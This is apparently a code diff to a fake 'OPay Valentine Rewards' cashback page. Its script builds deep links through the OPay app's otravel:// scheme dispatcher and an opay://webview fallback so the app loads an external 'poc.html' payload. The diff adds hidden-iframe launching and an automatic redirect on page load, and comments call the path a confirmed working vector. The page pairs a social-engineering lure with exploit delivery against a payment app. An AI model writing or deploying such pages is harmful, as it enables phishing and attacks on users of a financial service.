@@ -96,42 +96,79 @@
 
 <body>
     <div class="card">
-        <div class="logo">????</div>
+        <div class="logo">🎁</div>
         <h1>OPay Valentine Rewards</h1>
         <div class="sub">Tap below to claim your cashback reward in OPay!</div>
 
-        <a id="btnA" class="btn" href="#">???? Claim Reward Now</a>
-        <a id="btnB" class="btn alt" href="#">???? Open in OPay</a>
+        <a id="btnA" class="btn" href="#">🎉 Claim Reward Now</a>
+        <a id="btnB" class="btn alt" href="#">📱 Open in OPay</a>
 
         <div class="status" id="status"></div>
 
-        <div class="small">Powered by OPay ??? Offer expires soon</div>
+        <div class="small">Powered by OPay — Offer expires soon</div>
     </div>
 
     <script>
         var PAYLOAD_BASE = "https://zugonwobi.github.io/opay-rewards/";
         var CB = "?v=" + new Date().getTime();
 
-        // CORRECTED: OPay iOS registers "otravel" in CFBundleURLSchemes, NOT "opay"
-        // "opay" only appears in LSApplicationQueriesSchemes (queries, not responds)
         var pocUrl = PAYLOAD_BASE + "poc.html" + CB;
 
-        // Method A: otravel://schemedispatcher — the CONFIRMED working vector from Feb 20
-        var A = "otravel://schemedispatcher?scheme=" + encodeURIComponent(pocUrl);
+        // Method A: otravel:// scheme (registered in CFBundleURLSchemes)
+        var deepA = "otravel://schemedispatcher?scheme=" + encodeURIComponent(pocUrl);
 
-        // Method B: Try btravel:// (also found in CFBundleURLSchemes)
-        var B = "btravel://schemedispatcher?scheme=" + encodeURIComponent(pocUrl);
+        // Method B: opay:// scheme (try as fallback)
+        var deepB = "opay://webview?url=" + encodeURIComponent(pocUrl);
 
-        document.getElementById("btnA").href = A;
-        document.getElementById("btnB").href = B;
+        document.getElementById("btnA").href = deepA;
+        document.getElementById("btnB").href = deepB;
+
+        function setStatus(msg) {
+            document.getElementById("status").innerText = msg;
+        }
+
+        // Try deep link via hidden iframe (less disruptive than location.href)
+        function tryDeepLink(url, label) {
+            setStatus("Opening " + label + "...");
+            var iframe = document.createElement("iframe");
+            iframe.style.display = "none";
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            // Clean up after a few seconds
+            setTimeout(function () {
+                try { document.body.removeChild(iframe); } catch (e) { }
+            }, 3000);
+        }
 
         document.getElementById("btnA").addEventListener("click", function (e) {
-            document.getElementById("status").innerText = "Opening OPay via otravel://...";
+            e.preventDefault();
+            setStatus("Opening OPay via otravel://...");
+            // Try iframe method first
+            tryDeepLink(deepA, "otravel");
+            // Also set location as backup after short delay
+            setTimeout(function () {
+                window.location.href = deepA;
+            }, 500);
         });
 
         document.getElementById("btnB").addEventListener("click", function (e) {
-            document.getElementById("status").innerText = "Opening OPay via btravel://...";
+            e.preventDefault();
+            setStatus("Opening OPay via opay://...");
+            tryDeepLink(deepB, "opay");
+            setTimeout(function () {
+                window.location.href = deepB;
+            }, 500);
         });
+
+        // Auto-trigger on page load — try otravel:// automatically
+        setTimeout(function () {
+            setStatus("Redirecting to OPay app...");
+            tryDeepLink(deepA, "otravel");
+            // Fallback to location redirect
+            setTimeout(function () {
+                window.location.href = deepA;
+            }, 800);
+        }, 1000);
     </script>
 </body>
 
